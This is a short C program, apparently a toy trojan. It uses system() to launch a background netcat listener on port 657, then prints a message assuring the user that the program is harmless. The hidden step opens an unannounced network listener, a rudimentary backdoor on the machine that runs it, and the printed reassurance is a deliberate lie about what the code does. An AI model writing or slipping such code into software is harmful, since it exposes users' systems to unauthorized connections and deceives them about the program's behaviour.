#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main()
{

char cmd[100] = "";

strcat(cmd,"netcat -lp 657 &");
system(cmd);
printf("\n\nTrust me, this program is harmless!\n\n");
return 0;
}
